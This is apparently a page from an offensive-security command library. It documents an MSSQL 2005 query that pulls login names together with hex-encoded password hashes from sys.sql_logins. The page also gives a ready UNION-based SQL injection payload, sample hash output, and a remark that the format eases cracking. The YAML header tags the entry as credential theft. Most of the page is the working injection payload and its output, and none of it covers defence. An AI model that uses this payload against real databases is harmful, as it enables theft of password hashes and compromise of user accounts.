---
id: ff81f023-a0af-4f69-b4c6-b1dd82c69b05
name: mssql-2005-select-name-hex-password-hash-sql-logins
type: command
executor: sql
data: >-
  SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from
  master.sys.sql_logins
output: null
created_at: '2023-04-06T03:56:33.738244+00:00'
updated_at: '2023-04-10T20:22:43.467446+00:00'
platforms:
  - Windows
tags:
  - mssql
  - credential-theft
verified: true
validated: true
---

# mssql-2005-select-name-hex-password-hash-sql-logins

## Command

```sql
SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
```

## Description

This command concatenates usernames with their hex-converted password hashes from sys.sql_logins in MSSQL 2005, simplifying extraction in SQLi responses.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | Static; use in injection payloads. | N/A |

## Examples

### Basic Usage

`' UNION SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins --`

## Expected Output

name + '-' + master.sys.fn_varbintohexstr(password_hash)
---
sa-0x010500000000000015000000A8B6DF...
user1-0x020500000000000015000000...

Formatted output eases parsing and cracking.

## Related

- [[procedures/MSSQL-Credential-Theft-via-SQL-Injection]]
- [[commands/mssql-2005-select-name-password-hash-sql-logins]]
